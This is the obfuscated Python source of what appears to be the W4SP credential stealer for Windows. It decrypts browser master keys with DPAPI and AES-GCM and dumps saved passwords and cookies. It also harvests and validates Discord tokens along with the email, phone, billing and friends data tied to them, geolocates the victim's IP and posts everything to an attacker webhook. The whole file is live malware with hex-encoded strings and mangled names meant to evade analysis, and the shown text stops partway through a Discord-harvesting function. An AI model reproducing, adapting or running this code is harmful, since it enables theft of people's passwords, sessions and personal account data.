from builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open
exec(OoOo0000ooOO0oOOo000o0ooO)
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads,load
from ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer
from urllib.request import Request,urlopen
from json import loads,dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
hook=MMMNMMNNMNNNMNMMNMNNN
DETECTED=XXWXXWXXWXWXWWXXXW
def getip():
    ip=SS22SS2SS2SS22SSSS22S
    try:
        ip=urlopen(Request(xxxxwwwxwwxwwwxxxwwwxww)).read().decode().strip()
    except:
        pass
    return ip
requirements=[
[OOo000oO0oO0O0oo00o00ooo,SSSS22S2S222S2S2SS2S2],
[O0o0ooO0o000OOo0ooOo0Oo0,OoOooO00ooo0O0oO0oo0ooo0]
]
for modl in requirements:
    try:__import__(modl[ODDDoOooDoooODOODODDoDOOo])
    except:
        subprocess.Popen(eval(binascii.unhexlify(b'66227b65786563757461626c657d202d6d2070697020696e7374616c6c207b6d6f646c5b315d7d22').decode('8ftu'[::+-+-(-(+1))])),shell=DDooOoDoDDODoODDDD)
        time.sleep(mmmnnmmmnmmmmnnnn)
import requests
from Crypto.Cipher import AES
local=os.getenv(SSSSSSSS2222S2S2S22SSS)
roaming=os.getenv(IILIJILILJIJIJJLLL)
temp=os.getenv(OOOOOo0OOooOoO0oooO)
Threadlist=[]
class DATA_BLOB(Structure):
    _fields_=[
(MMNMMNMNNMMMMNMNMMNNMNNM,wintypes.DWORD),
(NMMNNNNMNNMMMMMMMM,POINTER(c_char))
]
def GetData(blob_out):
    cbData=int(blob_out.cbData)
    pbData=blob_out.pbData
    buffer=c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer,pbData,cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw
def CryptUnprotectData(encrypted_bytes,entropy=xxxxxwxxwxwwwxwxxx):
    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))
    buffer_entropy=c_buffer(entropy,len(entropy))
    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)
    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)
    blob_out=DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):
        return GetData(blob_out)
def DecryptValue(buff,master_key=None):
    starts=buff.decode(encoding=lIllllllIlIlIlIllIIIIIl,errors=DDoOoODDDooooooODo)[:ijljlllljlllljjijlijljljj]
    if starts==IIllIIlIlllIllIIlIII or starts==XWWWWXWXXWXWXWWXXXXWXWXX:
        iv=buff[S22S222S2S22SS2222SS2SS2:S2SSSS2SS2SS2S22S222222S2S]
        payload=buff[OOoOOOoOOooDoDDOo:]
        cipher=AES.new(master_key,AES.MODE_GCM,iv)
        decrypted_pass=cipher.decrypt(payload)
        decrypted_pass=decrypted_pass[:-OOOoDDoooooODooooODDo].decode()
        return decrypted_pass
def LoadRequests(methode,url,data=oOoOOOooOODoDDoDO,files=XXXXWXWXWXWXWXWXXWXWXWXXX,headers=OOo0O0ooO0OO00O0OO0):
    for i in range(Oo0ooOoOOoOOO0o000Oo0Oo):# max trys
        try:
            if methode==NNNNNNNMNMMMNMMNMMNN:
                if data !=LIJLIILJIJJIILLLJLLLI:
                    r=requests.post(url,data=data)
                    if r.status_code==wwxwxxxxxwwxxxxwwwwxxwww:
                        return r
                elif files !=nmmnnmnmmnnnmmnnmnmmmn:
                    r=requests.post(url,files=files)
                    if r.status_code==XXWXWWXWXXXXXXXXXXWWXXXXW or r.status_code==xxwwwwxwxwxxwxwxxxwwxxww:# 413=DATA TO BIG
                        return r
        except:
            pass
def LoadUrlib(hook,data=O0Ooo0oOoooOoOOOOooOO0,files=oOoDOOoDoODooDoOODo,headers=Oo0ooOoO00Oo0Ooo0O0o00ooo):
    for i in range(JJLILIIJIJIILLLJJLJJJIILJ):
        try:
            if headers !=XXXXXXWXWWXWXWXXWWXXWXXWX:
                r=urlopen(Request(hook,data=data,headers=headers))
                return r
            else:
                r=urlopen(Request(hook,data=data))
                return r
        except:
            pass
def globalInfo():
    ip=getip()
    username=os.getenv(NNMNNNNMNMNNNNMNNNMNMMN)
    ipdatanojson=urlopen(Request(eval(binascii.unhexlify(b'662268747470733a2f2f67656f6c6f636174696f6e2d64622e636f6d2f6a736f6e702f7b69707d22').decode('8ftu'[::+-+-(-(+1))])))).read().decode().replace(LILLJLLIJJLIJLJIIL,MMNMNMMMMMNNMNNNM).replace(lIIlIIIIlIIllllIII,lIlllIIlIIIIllllIIIlll)
    ipdata=loads(ipdatanojson)
    contry=ipdata[ooOoDDDDOoOOoOOOODODO]
    contryCode=ipdata[S2SS2S2SS222SSS22SS2S2].lower()
    globalinfo=eval(binascii.unhexlify(b'66223a666c61675f7b636f6e747279436f64657d3a20202d20607b757365726e616d652e757070657228297d207c207b69707d20287b636f6e7472797d296022').decode('8ftu'[::+-+-(-(+1))]))
    return globalinfo
def Trust(Cookies):
    global DETECTED
    data=str(Cookies)
    tim=re.findall(jiljijijjijllljjilil,data)
    if len(tim)<-WXXWXXWXWXWWXWXWX:
        DETECTED=jjllijjlilljljjjlill
        return DETECTED
    else:
        DETECTED=OO0OOo0000o0oOOo00o0000
        return DETECTED
def GetUHQFriends(token):
    badgeList=[
{WWWWXXXXXXWXXXXXWXWWW:nmmnmnnmnmnmmmmnmn,wwwxxxxxxwxwwxxxxxwxww:Oo000o0OOooOOooOOOoO0OOO0,DDOOoDooOODDoOODODo:oDDODoDOooOOoDDoooDoDoDoO},
{llilillljljjjjiiljilljilj:WWXWWWXWXXXWXWWXXXWXWWXWW,IJIIJIILILJLIJJJJJJIILJIJ:Oo00Ooo0O0O00OOoO0oOOooo0,JILLJLIJLIIJIJJIILJJJII:MNNMMNNNNNMNNNNNNNNNNN},
{NMMNMMMNMMNNMMNNMNNNNM:DoOOOoooOODDoDDODOOD,SS22S2SSSS2SSSS2S2S222S:NNMMMMNNMMMNNNNMNNMMNMN,XWWWXWWWWXWWXXWXWWW:nmmnmnmnnnmmmmmmmmnm},
{S2S222S2S2S2S22SS222S2S2:ODDoDOoooOODODDOOoo,DODOODOoDDODDODOooODOoOD:iljiiiiiiljliijliil,XXWXXXWWXXXXWXXWWXXWXW:WWWWXWWWWXXXXXWWXWXWWWWX},
{SS2S2SSSS22SSSS2S2S2S22:mmmmnmmnmmmnnnmnnmnmnnnnn,wxwxxxwxwwxwxxxxwx:MMMMMMNNNNMMNMNMNMM,XWWXWWWWWWXWWWWWWXX:jljiljlijlijiiijijij},
{XWXWXWWWWXXWXXWXWWWWX:mnnnmnmmnmnnnmmnmn,XWXXWXWWXXWWWWWWWWWX:O0OOo00oO0OOoo0o00o,nnmnnnmnnmnmnnnmnn:wwwwxxxwwwxxxxwwxw},
{IllIlIlIIlllIIIllll:OODDDODOooDooODDDo,JJIILLILLJJIJLIILL:wxxxxxwwwwxwxwxxxxxww,XXXWXXWXWWXXWWXWXWWXXXWXW:ijiiljliiiijijjil},
{ILIJJJIIJLIJLLIJI:DoOOoooooDoODoDooDoooooD,S2S2SS22S2S2222S2S22:XXXXWXWWWXWXWXXXXWW,ODOoooOOODDDDDDOOo:xxxwwwxwwwxxwxwwxwwx},
{ILJJLJJLIJJJLIILIJI:xwxxxwwxxxwxxwwxxw,DODODDOOOODOoDoooD:IILLIJJJJLLLILJJJJIL,lIIlIlIllIIIlIlIlIIllIIlI:IILLJJILJJLIJJJLLI},
{O0OOOO0O00o0OoO0oo0OoO:xxxxxxwwxxxxwwxxxwwwxwxx,lIlIIIIIllIlIllIIIII:nnnmnnnnmmnmnmmmnnmmnn,O0oo000OOOOOO0oOoOOOOOO0:OOoOOoo000O0O0Oo0O0o0o0}
]
    headers={
        nnmmnnnnnmnmnnnnmnmnnmnmm:token,
        mnmnmmmmmnnmnnnnmnn:JIIIILLIIJJLJLLLJ,
        MMMNMNMNNMNNMNMNNNMM:iijjjjlliiljljliijlj
}
    try:
        friendlist=loads(urlopen(Request(XXXWWXXWXXWXWWWXXWWWXXWW,headers=headers)).read().decode())
    except:
        return O0oOOOo0000OOooO0OoO00OooO
    uhqlist=WXXWXXWXWXWWWWXXWWXWW
    for friend in friendlist:
        OwnedBadges=jjljiljiiliijlijijilljj
        flags=friend[xxxxwxwwxwxxxwxwwww][SSS2SS22S2S2S2S2SS222SS22]
        for badge in badgeList:
            if flags//badge[XXXWXWWXWWXWXWXWWXXW]!=IlIIIIIIlllllIIlIIlllll and friend[LLIJJJJLILLIIJIIIIJI]==ODODODDOOoOOOODoOo:
                if not MNNMMNMMMNMNNMNNMNMMMNM in badge[Oo0OOOo0oOOo0oOOoO]:
                    OwnedBadges+=badge[XXWWWWXWWWWWWWXXW]
                flags=flags % badge[JLJIJIILLLIJJJIJLIJLIJLJJ]
        if OwnedBadges !=IllIlIIIIIIllIlIlllllIlI:
            uhqlist+=eval(binascii.unhexlify(b'66227b4f776e65644261646765737d207c207b667269656e645b2775736572275d5b27757365726e616d65275d7d237b667269656e645b2775736572275d5b276469736372696d696e61746f72275d7d20287b667269656e645b2775736572275d5b276964275d7d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
    return uhqlist
def GetBilling(token):
    headers={
        S222S2SSS2S22SS2222SS2S:token,
        lIIIlIIIlIIlIllIl:S22S2SS2S22S2222SSSS222S22,
        ooDOOoOOooDoDDoOooDo:O00oO0000oO0oOo0Oo00O
}
    try:
        billingjson=loads(urlopen(Request(ILJLJLJLLIILLLJJLIJJIIJ,headers=headers)).read().decode())
    except:
        return nnmnmmmmnnmnnnmmmmmnnnn
    if billingjson==[]:return mnnnnmnnnnnnnnnmmmmnmnnm
    billing=LJJILJJJIILIJJJLIJLI
    for methode in billingjson:
        if methode[S2222SSS22S222SSSSS2]==nmnmnnnnmnmnnmmnmm:
            if methode[wxwwwxxxwxxwwxwwxxw]==nmnmnnnmmnmmmmnnnm:
                billing+=JIIJLIILLJLJJLIJI
            elif methode[O0O0o0Oooooo0OO00oO0oo]==XXWWXXWXXWXXWXWWWW:
                billing+=LJJLIJLIJJJJLJJJLJI
    return billing
def GetBadge(flags):
    if flags==lIlIIllllllIlIlIIIIll:return wxxwxwxwwwwwxwxxww
    OwnedBadges=XXWWWWWXWXXWWWWWXXWWX
    badgeList=[
{NNNNMNMMMNNNMNMMNNMNNMN:oDODOOOooODODoooODoD,IIlllllIlIIlIIIlllIlll:ooDDoDDoDoDOODoDDoDOoO,OoDOooOOODoOoOoooD:SSSS2S22SSSSSSS222SS2},
{OOO0OOo0OO0ooO0oOO:WXWWXXWWXXXXWWXWXWWWXXXX,DooooOOoooDDOOODoODDoDOoD:NNMNMMMMMMNNNNNNMMNNNN,NNMMNNNNNNMMNNNNMNMNNN:MMNMNMMNNNNNNMMMMM},
{jlliiijjiiiilliiljllljl:nnnmnmnmmmnmnmmmnmnnnm,DDoDDDODOoDOOooooD:SS22S22S22222S222S2SS,oOoODDOoooDDOoDoDoDDoo:ljiiijijijlllijjlii},
{WXXWWXWWXWXXWXWWXXXWWWXXW:XXWWXWXWWWWWXWXWXWWXXWX,jjjjlllijlljlliijj:WWWWXWWWXXWWXXXXXXXXXW,jiiijliljljijijjjjijiil:OOOOoDDODODoOoOOOoDODDDoo},
{S22S222SS2S22SS22222S:LLJILILLLILJLLJIIIILILIII,Ooo0OOo0o0o0O0ooOOo:lljiilllilliljjjiljjii,S2S2SSS22SS2222SSS:DoDDoODoDODODOOODDOODoo},
{lIIlIIIIIIIlIIIlIIll:XWXXXWWWXWWXWXWWXWXXXXW,MNMNNMMMMMMMMNMMMMM:illjiijjljljjllliil,NNMNNNNNNNMMNMMNM:llIllllllIIlIlIlIIIl},
{SSSSSSSS22S2SSS222SSS22S:OooO0Oo0o0oOOo0oO00,wwwxxxwxxwwxxxxwwwx:jiijjjllljliljjljjiijjjii,xxxwxwwxwxwwwxxxxxxwwwww:JJIJLLLJIJIJIIIJIIII},
{S2S2S222SS2SSSSS2SS2SS:Oo00Oo0O00OOoooO0O,ILILLJLILLLLLJIIJ:IIIILJJLILLIIJLLILJLJL,DDODoDODOODOooDooo:llIIIllIlIIIIIIlllII},
{SSSS22S2SSS2SS22SS22:mmmnmmmnnnnnmmmmnm,S222S2SS222S22222SSS222:oooOoOooDoDODDDOODDDODOO,OoO0O0o0OOO00o0Oo0Oo00oo:LJJLIJJJIILIIILILIIJ},
{nnmnmmnmmmnnnmmnnnmn:xxxxwxwxxwwxxxxxxxwwww,oDoDODoOooODOOOooO:DOODDDOooOOOoDDDoOODDOoD,OOo00OOOo0OoOooO0oo:SSS2S2S2222S22S2SSSS2SS}
]
    for badge in badgeList:
        if flags//badge[LJJIIIJLIJIILJJIILJJJILI]!=S2222SS2S2SSS2SSS2S2S22S2S:
            OwnedBadges+=badge[mmnnmmmnnnmnmmmnnm]
            flags=flags % badge[IJLJJJLLLIILJILLL]
    return OwnedBadges
def GetTokenInfo(token):
    headers={
        mmnnmnmmnnnmmmnnnmmm:token,
        OOO0O0OOO0ooo0OOoO0:llIIllIllIIIIIIlIIlI,
        SSS22SS2S2SSS22SSS2:OoO0O00Oooo0oo0oOooooO0
}
    userjson=loads(urlopen(Request(mmnmmmmmmnnnnnmnnmmnm,headers=headers)).read().decode())
    username=userjson[JJLLIJLLJLLIJJLIL]
    hashtag=userjson[OODDOoODODOooDODoo]
    email=userjson[LJIJIJJJLIJILLLLILJJL]
    idd=userjson[XXXWWWWXXXXXXWXWW]
    pfp=userjson[jlliillilijjiilil]
    flags=userjson[OoOoO0o00O0O0oOoooo000oooO]
    nitro=IlllIllIIIIlIlIlllIlIII
    phone=wxwwwwwxxwxwwwwwww
    if DoODoOOoDDooOoDDD in userjson:
        nitrot=userjson[OOOoO0oOo0ooOOOooO0o0o]
        if nitrot==IJLIJLJLIILLLLJLJIJJLLIL:
            nitro=WWWXWWXWXXWXXWXWWXXW
        elif nitrot==mnnmmmmmmmmnmmmmmmmnnm:
            nitro=xxxwwwxwxwwwxwwwxw
    if nnnnmnnmmmmnmnnnnnnmnnn in userjson:phone=eval(binascii.unhexlify(b'6627607b757365726a736f6e5b2270686f6e65225d7d6027').decode('8ftu'[::+-+-(-(+1))]))
    return username,hashtag,email,idd,pfp,flags,nitro,phone
def checkToken(token):
    headers={
        lllIlIIIllIlIIlII:token,
        xxwxxwxwxwwxxwwwxx:SSSSS2S2S2SS2222SS2S22S2,
        lllIllIIlIIllllIlllIllI:IILLJJIJJLILIJLLIJLIJ
}
    try:
        urlopen(Request(nmmmnnnnmmmmmnnnmmmm,headers=headers))
        return OoO0ooooo00O0000oOO000O0o
    except:
        return lIllIIllllIIllllIll
def uploadToken(token,path):
    global hook
    headers={
        wxwwwwwwxwxxwwwxxxxxx:lIIlIllllllIIIIlI,
        Ooo0oo0Oo00o0o00O0oO:xxwxxwxxwwxwwxxxxxw
}
    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)
    if pfp==None:
        pfp=O0ooO0o00o0o00OoOOoOoo
    else:
        pfp=eval(binascii.unhexlify(b'662268747470733a2f2f63646e2e646973636f72646170702e636f6d2f617661746172732f7b6964647d2f7b7066707d22').decode('8ftu'[::+-+-(-(+1))]))
    billing=GetBilling(token)
    badge=GetBadge(flags)
    friends=GetUHQFriends(token)
    if friends==S2SS22S22SS2SS222S2S2:friends=SSSS22SSS2S222S2SS2
    if not billing:
        badge,phone,billing=iiijijjiljiljiililii,llllIIlllllIIIIIllIIl,IJIJLJILLIIIILLLI
    if nitro==WXXWXWWXWXWXXWWWWWXX and badge==NMMMMMMMMNNNNNMMN:nitro=ljjlillljjiiljlijillijij
    data={
        O0oO0OoOoooO0OO0o0Oo0Oo0Oo:eval(binascii.unhexlify(b'66277b676c6f62616c496e666f28297d207c20466f756e6420696e20607b706174687d6027').decode('8ftu'[::+-+-(-(+1))])),
        S22222SS2SS22S2SSSS222S:[
{
            LJJLILIJLIJILLIIIII:WWXWXWWWWWXWWWXWXXXWXXXWW,
            XWXWXWWWXWWXXXXWWXXWX:[
{
                    WXXXWXWXXXXWXWXXXWXWWWXX:LIJLLLJLIJLIIILJIJLIJ,
                    MMMMMNMNMMNNMMMNMMMMMNN:eval(binascii.unhexlify(b'6622607b746f6b656e7d605c6e5b436c69636b20746f20636f70795d2868747470733a2f2f7375706572667572727963646e2e6e6c2f636f70792f7b746f6b656e7d2922').decode('8ftu'[::+-+-(-(+1))]))
},
{
                    oODoOOooODDoOOoODOOoDo:O0OO0o0oO0ooO0o0000oOo0o,
                    mnmmmnmmnnmnnmmnnnnnnnmnn:eval(binascii.unhexlify(b'6622607b656d61696c7d6022').decode('8ftu'[::+-+-(-(+1))])),
                    mnmnmmmnnnnnmmmnnmm:MNMNNMMMMNNNMMMNMMMM
},
{
                    jjiiijiiljjjiljjilljllj:SS222222S22222S2S2222S222,
                    S2222S22SSS2S222S2S22SS22S:eval(binascii.unhexlify(b'66227b70686f6e657d22').decode('8ftu'[::+-+-(-(+1))])),
                    IIIIIIIIlIIIlIllIllIIlIll:LLLJJIILLIILILLJJJLJIJLII
},
{
                    LLIILILJJLLIIJLLJJJIJII:ODooOoDDOoDOoOOooODDooDDO,
                    wwxxxxxwxwxxwwxwxwwwxxxx:eval(binascii.unhexlify(b'6622607b676574697028297d6022').decode('8ftu'[::+-+-(-(+1))])),
                    lllIIIIlIlIIIIlIlIIlIllI:O0OOoO0ooOo0ooOo0OOo00
},
{
                    oOoooOOODoooOoOOODo:ILJIIIJLJJJIIJLLLIIJII,
                    mnnmnnmnnnmmnmnmnnn:eval(binascii.unhexlify(b'66227b6e6974726f7d7b62616467657d22').decode('8ftu'[::+-+-(-(+1))])),
                    nmnmmnmnmmnnnmmnmnn:wwwxwxxxwwxwwwwwxxwxwxwxx
},
{
                    IIIIJLIIJIIILJLLIJILLJI:MNNNNNMMMMMMMMMMMNNNMNMM,
                    ilijliljilllijjiiijllljij:eval(binascii.unhexlify(b'66227b62696c6c696e677d22').decode('8ftu'[::+-+-(-(+1))])),
                    llIlllIIllIlIlIII:LLJIIJLJIIJILIJLJIJ
},
{
                    NMNMNNNMMNNMNMNMMNNNM:XWWWXXWWXWXWWWXXWWWX,
                    SS2222S222222SSSSSS:eval(binascii.unhexlify(b'66227b667269656e64737d22').decode('8ftu'[::+-+-(-(+1))])),
                    IlIIllIlllllIIlIlIlIlIll:MMMMMMNMNMNMMMNNNNNNMMM
}
],
            OoDOOoODOOOoDoooDODD:{
                jliljillllljilliiiji:eval(binascii.unhexlify(b'66227b757365726e616d657d237b686173687461677d20287b6964647d2922').decode('8ftu'[::+-+-(-(+1))])),
                S222S22SS22SS2S2S2SS2S222:eval(binascii.unhexlify(b'66227b7066707d22').decode('8ftu'[::+-+-(-(+1))]))
},
            SS22S22222S222SSSS2222S:{
                OOo0Oo0oo0Oo0oOoOO0000o000:LLLJIIJJJIJIIIJJLLIIIJJ,
                wwxxxwxxxxwwxxxwxxw:OoDOOoOOoOOoODOODoDOOOOo
},
            SSS2SSSSS22SS22SSS22SS22:{
                S2222S222222S2SSS2S2S22S:eval(binascii.unhexlify(b'66227b7066707d22').decode('8ftu'[::+-+-(-(+1))]))
}
}
],
        oOOOODOOOoOODDDDOOODDOOOo:lllllllIllIIIlIlIIlIIlI,
        LIJLJJLLJIJLLLIJLIILJI:SS2S2S2SS2S22222SS22S2SS22,
        WWWWXXWXWWWWWXWXWX:[]
}
    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
def Reformat(listt):
    e=re.findall(OOO000OoOO0OO0o0Ooo,listt)
    while mnnnmnmnmnnnmmmnnnmnmm in e:e.remove(jjjiiiijljliilljlliji)
    while mmnmnnmnnnmnnnmmnmmnmmnnm in e:e.remove(wwxxwxwxxxxxxxwxxxxxwww)
    while nmnnmnmnmnnmmmmmnmnmn in e:e.remove(S2S2S2SSSSSS22222SSS2S2S)
    return list(set(e))
def upload(name,link):
    headers={
        illililiillilijjj:OOO0000O0O000Ooo00OoO0OOO,
        SSSS22S2SSS2S22S22SS2S2S2:SS2S2S2SSS2SS2S22S2S2S
}
    if name==S22S2S2SS22S2222SS2S222:
        rb=oDoODDOODOoDoOooD.join(da for da in cookiWords)
        if len(rb)>lilijiillljijlljijilii:
            rrrrr=Reformat(str(cookiWords))
            rb=XXWXXXXWWWWWXXWWW.join(da for da in rrrrr)
        data={
            WWXWWXWXWWXWXWXXWXWXWWXWW:globalInfo(),
            llIlIllIllIllllIl:[
{
                    LJIIIJIIJLLLJLLLJLJJLILL:XXXWXWWXXWXXXXWXX,
                    ooDoDOOODDDOODDoOOOooDDD:eval(binascii.unhexlify(b'66222a2a466f756e642a2a3a5c6e7b72627d5c6e5c6e2a2a446174613a2a2a5c6e3a636f6f6b69653a20e280a2202a2a7b436f6f6b69436f756e747d2a2a20436f6f6b69657320466f756e645c6e3a6c696e6b3a20e280a2205b77347370436f6f6b6965732e7478745d287b6c696e6b7d2922').decode('8ftu'[::+-+-(-(+1))])),
                    jljllljjjjlijllii:Oo0O0O0Oo0o0oOooo0OO00o00,
                    oOoDDODoooODDDooD:{
                        mmnmmnnnnnmnnmmnmmnmmmmm:DoDDooOODDDDOoOODOo,
                        ILJLIJJLJILJJLLJJJIJIIILL:XXXXWWXWWXWWXXWWWWXX
}
}
],
            XWXWXWWWXXXXXWXXXWWXWXWWW:DoODooOoDOODDooDDDDODDODD,
            SSSS2S2222SS2SS2222S:MMNMNNNMNMMNNMNNM,
            SSS2SSSS2S2SSS2SS2S:[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
        return
    if name==wxxxxwwwwxxxwwwwxxwwx:
        ra=liiijjjliiliiljij.join(da for da in paswWords)
        if len(ra)>lIlIIlIIIIIllllIIIl:
            rrr=Reformat(str(paswWords))
            ra=MMNMNNNNNMMNNMNNMNNMNNNMN.join(da for da in rrr)
        data={
            LIIJILJJLILJJJJLL:globalInfo(),
            WXXXWXXWWWWXXWXXXXXXXWW:[
{
                    LJJLIJLIJJLILJLJILLIILL:JIIIIJLJJJJJJIJIJJJ,
                    XXWWXWWXWXWXXXXWWWW:eval(binascii.unhexlify(b'66222a2a466f756e642a2a3a5c6e7b72617d5c6e5c6e2a2a446174613a2a2a5c6ef09f949120e280a2202a2a7b5061737377436f756e747d2a2a2050617373776f72647320466f756e645c6e3a6c696e6b3a20e280a2205b7734737050617373776f72642e7478745d287b6c696e6b7d2922').decode('8ftu'[::+-+-(-(+1))])),
                    mmnnmmnnmnmmnmnnmnnnm:oDOoDoDDoDoOOODDDDOO,
                    iijjijljjjilljjljilii:{
                        jiilliiljlljjjliljijllji:Oo0oO0O0OOoOoOo0o0O0OO0o,
                        JLLIIIIIJLJIILIJJL:MNMMMMMNMMNMNNMMNNNN
}
}
],
            LILIIIJJIJLIJLIJILILJJLL:lljjjjijiijjljiii,
            xxxwwxwwxwwwwxxxwxw:DDOOOODooDDoDDODODooooODD,
            NMNNNNNMNMMNNNMMNN:[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
        return
    if name==OOO0o0o0OOoooo0Ooo00O0O0:
        data={
            MNNNMNMMNMNMNMMMMNMNMNN:globalInfo(),
            xwxwwwwxwwwwwxxxxw:[
{
                lIlllllllllIllIlIlIIIlIl:llllllIlIIlllIlIlIIl,
                OO0OOO00ooOOO0OO0ooooo:[
{
                    xwwwxxwwxwxwwwxxxwxwwwx:SSSS2SSS22222SS2SS2S2SS2,
                    O0oO00000O00ooO0o00OooOo0o:link
}
],
                nnnnnnnmnmnnmnnmmnnnmmmnm:{
                    DooOODODoDDODODDOoOoO:jilijllilliiliijijjjllj
},
                mmnmnmnnmnnnnmmnmmnmn:{
                    llllllllllIIlIlllIIII:wwxxwwxxwxxwwxwxww,
                    jljilljlljjilljilil:xwwxxwxwxwxwxwwxwwxwwww
}
}
],
            liilljlilijjiljijijljillj:NMMMNNMNMMNMNMNMMMMMNMNMM,
            LIJIJIJJIJILILJLJILJI:lIllIIIIllllIlllIIlIIIl,
            JJJJLLIJLLLJIJIILLJLLJ:[]
}
        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
        return
def writeforfile(data,name):
    path=os.getenv(S2SSSS22S22S22SSS22SSS2)+eval(binascii.unhexlify(b'66225c77707b6e616d657d2e74787422').decode('8ftu'[::+-+-(-(+1))]))
    with open(path,mode=mmnmmmnmmnnnnnmnnnmnnnnmm,encoding=XXWWWWXXXXXWWXXWXXWWX)as f:
        f.write(eval(binascii.unhexlify(b'66223c2d2d5734535020535445414c4552204f4e20544f502d2d3e5c6e5c6e22').decode('8ftu'[::+-+-(-(+1))])))
        for line in data:
            if line[OoDOOoooODOODDooDooOOODOO]!=SS2SS22222SS2SSS2SS22SSSS2:
                f.write(eval(binascii.unhexlify(b'66227b6c696e657d5c6e22').decode('8ftu'[::+-+-(-(+1))])))
Tokens=IlllIlIIlIIlIlIIlllIlI
def getToken(path,arg):
    if not os.path.exists(path):return
    path+=arg
    for file in os.listdir(path):
        if file.endswith(jiiiljliljjljijjiilliilj)or file.endswith(IIlllIIlIlIIlllllI):
            for line in[x.strip()for x in open(eval(binascii.unhexlify(b'66227b706174687d5c5c7b66696c657d22').decode('8ftu'[::+-+-(-(+1))])),errors=XXWXWWXXXWWWWWXXWWXX).readlines()if x.strip()]:
                for regex in(mmnnmnnmnnmnmnnnmmmmmmmnn,OO0OOO0O00O0ooOoooO00o00Oo):
                    for token in re.findall(regex,line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                Tokens+=token
                                uploadToken(token,path)
Passw=[]
def getPassw(path,arg):
    global Passw,PasswCount
    if not os.path.exists(path):return
    pathC=path+arg+ODDDoOoooooODOOoOOD
    if os.stat(pathC).st_size==S22SSSS2SS2SS2SSS222:return
    tempfold=temp+WXWXXWXXWWWWWXWWWX+S222SSS222SSS22S22S22222S2.join(random.choice(mmmmnnnnmnmmmnnmmnnmn)for i in range(mnnnmmmnnmmmmnmnmmmmnnmnn))+ODoOooODDoOoDoOoODD
    shutil.copy2(pathC,tempfold)
    conn=sql_connect(tempfold)
    cursor=conn.cursor()
    cursor.execute(iilliljlijljjljjj)
    data=cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey=path+WWWWWWWWWWXWXWXXWXX
    with open(pathKey,XXWXWXXXWWWWWWXWXXW,encoding=OoODoDOoDoDoDDoOD)as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state[O0O0O0OOOo0OoooOo00OOo][WWXWXXWXXXWXWWWWWWXXW])
    master_key=CryptUnprotectData(master_key[NMNNNMNNMMMMNMMMNMNN:])
    for row in data:
        if row[WXWXWXWWWXWXWWXWWWWWXWX]!=S2222SSS2222SS2S22SSS2S:
            for wa in keyword:
                old=wa
                if jlililliljljijillliiijlj in wa:
                    tmp=wa
                    wa=tmp.split(MNNNMNMNMNMMMMMNNMN)[ILJLIJIJIJIJJIJLLLL].split(O0OoOoo00OOO000oOOoOo0)[wxwxxxwxxxwwwxxxxw]
                if wa in row[IIIIILJLJLJJLJJLLILJJJIIL]:
                    if not old in paswWords:paswWords.append(old)
            Passw.append(eval(binascii.unhexlify(b'66225552313a207b726f775b305d7d207c20553533524e344d333a207b726f775b315d7d207c2050343535573052443a207b4465637279707456616c756528726f775b325d2c206d61737465725f6b6579297d22').decode('8ftu'[::+-+-(-(+1))])))
            PasswCount+=WXWXXXWXWXXWXXXXWXX
    writeforfile(Passw,LLJLIIJJIJLJILJJJIJIL)
Cookies=[]
def getCookie(path,arg):
    global Cookies,CookiCount
    if not os.path.exists(path):return
    pathC=path+arg+S2S2S2S22SS2SS2SSS2
    if os.stat(pathC).st_size==llllIIlIlIIIlIIlIll:return
    tempfold=temp+JLILILJLJIJJJLJJL+S2SS2SS22S2S22S2S2S222SSS2.join(random.choice(mmmnnmnnnmmnmmmnmmnmnm)for i in range(LILILLLILIILJILIIJLLL))+OO00oOO00OOoooooO0
    shutil.copy2(pathC,tempfold)
    conn=sql_connect(tempfold)
    cursor=conn.cursor()
    cursor.execute(wxwxxwwxxwxwxxwxxwxwxw)
    data=cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey=path+XWXWXWXWXXXWWWXXXWWXXWW
    with open(pathKey,llIllIlIIIIIlIIlIlllIIlll,encoding=S222SSSS2S2S2SSSSSSSSS22)as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state[SS22S2222S2222S222S222][JLJLJLLLLLLJJLLIJJJLJ])
    master_key=CryptUnprotectData(master_key[IIIIlIIlIIIlIlIlIlllll:])
    for row in data:
        if row[Ooo00OOo00o0Ooo0O0OooO]!=mmmmmmmnnmnnnmmnnnnm:
            for wa in keyword:
                old=wa
                if ILIJLJLLJJLJIILJIIJILIJLJ in wa:
                    tmp=wa
                    wa=tmp.split(xxwwxwxxxxxwwwxxxwwx)[JJJLIJLJIILIJIIIIIJIJILI].split(nmnnmnnnmnmmmmnnnmnmmnmm)[JILLJLJIIIJJIIIILL]
                if wa in row[OoooOOoDDOoOODDoDooOo]:
                    if not old in cookiWords:cookiWords.append(old)
            Cookies.append(eval(binascii.unhexlify(b'662248303537204b33593a207b726f775b305d7d207c204e344d333a207b726f775b315d7d207c2056343155333a207b4465637279707456616c756528726f775b325d2c206d61737465725f6b6579297d22').decode('8ftu'[::+-+-(-(+1))])))
            CookiCount+=S222222SS222222222SS22S
    writeforfile(Cookies,wxxwxwxwxxwxwwwwxwwwwxww)
def GetDiscord(path,arg):
    if not os.path.exists(eval(binascii.unhexlify(b'66227b706174687d2f4c6f63616c20537461746522').decode('8ftu'[::+-+-(-(+1))]))):return
    pathC=path+arg
